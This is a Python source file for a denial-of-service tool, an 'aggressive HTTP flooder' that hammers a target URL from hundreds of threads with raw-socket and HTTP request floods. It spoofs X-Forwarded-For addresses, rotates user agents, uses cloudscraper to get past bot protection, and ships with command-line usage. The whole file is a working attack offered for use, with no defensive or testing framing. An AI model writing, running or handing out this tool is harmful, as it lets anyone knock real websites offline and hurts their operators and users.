import sys
import time
import random
import threading
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor
from cloudscraper import create_scraper
import dns.resolver

class AggressiveHTTPFlooder:
    def __init__(self, target_url, workers=500, duration=300):
        self.target_url = target_url
        self.workers = workers
        self.duration = duration
        self.running = False
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.domain = target_url.split('/')[2] if '//' in target_url else target_url.split('/')[0]
        
        # Connection reuse settings
        self.keepalive_timeout = 30
        self.max_retries = 3
        
        # Target analysis
        self.target_ip = self._resolve_target()
        self.target_port = 443 if target_url.startswith('https') else 80
        
        # Attack configuration
        self.connection_timeout = 5
        self.read_timeout = 5
        self.max_redirects = 0  # Disable redirect following
        
        # Initialize raw sockets
        self.socket_pool = [self._create_raw_socket() for _ in range(min(100, workers))]
        
    def _resolve_target(self):
        """Resolve target to IP for raw socket connections"""
        try:
            return socket.gethostbyname(self.domain)
        except:
            print(f"[!] Failed to resolve {self.domain}")
            sys.exit(1)
    
    def _create_raw_socket(self):
        """Create raw socket for layer4 attacks"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.connection_timeout)
        return sock
    
    def _create_http_request(self):
        """Generate malformed HTTP requests"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        
        headers = [
            f"Host: {self.domain}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept: */*",
            "Connection: keep-alive",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        ]
        
        payload = f"{random.choice(methods)} {path} HTTP/1.1\r\n" + \
                 "\r\n".join(headers) + \
                 "\r\n\r\n"
        
        return payload.encode()
    
    def _socket_flood(self):
        """Low-level socket flood attack"""
        while self.running:
            sock = random.choice(self.socket_pool)
            try:
                if random.random() > 0.7:  # Occasionally create new connections
                    sock = self._create_raw_socket()
                    sock.connect((self.target_ip, self.target_port))
                
                sock.send(self._create_http_request())
                sock.recv(1024)  # Read just enough to complete handshake
                
                with threading.Lock():
                    self.stats['total'] += 1
                    self.stats['success'] += 1
                    
            except:
                with threading.Lock():
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                sock.close()
                self.socket_pool.remove(sock)
                self.socket_pool.append(self._create_raw_socket())
    
    def _http_flood(self):
        """High-level HTTP flood with session reuse"""
        session = create_scraper()
        session.verify = False
        session.timeout = (self.connection_timeout, self.read_timeout)
        
        while self.running:
            try:
                session.get(
                    self.target_url,
                    headers={
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                            'Mozilla/5.0 (X11; Linux x86_64)',
                            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)'
                        ]),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    },
                    allow_redirects=False
                )
                
                with threading.Lock():
                    self.stats['total'] += 1
                    self.stats['success'] += 1
                    
            except:
                with threading.Lock():
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
    
    def _monitor(self):
        """Display attack statistics"""
        start_time = time.time()
        while self.running and time.time() - start_time < self.duration:
            elapsed = time.time() - start_time
            rps = self.stats['total'] / elapsed if elapsed > 0 else 0
            print(f"\r[+] Requests: {self.stats['total']} | RPS: {rps:.1f} | Success: {self.stats['success']} | Failed: {self.stats['failed']}", end='')
            time.sleep(0.5)
        print()
    
    def start(self):
        """Launch the combined attack"""
        self.running = True
        print(f"\n[+] Starting aggressive flood against {self.target_url}")
        print(f"[+] Workers: {self.workers} | Duration: {self.duration}s")
        
        # Start monitoring
        threading.Thread(target=self._monitor, daemon=True).start()
        
        # Start workers
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            # 70% socket flood, 30% HTTP flood for maximum impact
            futures = []
            for i in range(int(self.workers * 0.7)):
                futures.append(executor.submit(self._socket_flood))
            for i in range(int(self.workers * 0.3)):
                futures.append(executor.submit(self._http_flood))
            
            # Wait for completion
            for future in futures:
                future.result()
        
        self.running = False
        print("\n[+] Attack completed")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_url> <workers> <duration>")
        print("Example: python flooder.py http://example.com 500 300")
        sys.exit(1)
    
    target = sys.argv[1]
    workers = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    flooder = AggressiveHTTPFlooder(target, workers, duration)
    
    try:
        flooder.start()
    except KeyboardInterrupt:
        flooder.running = False
        print("\n[!] Attack stopped by user")
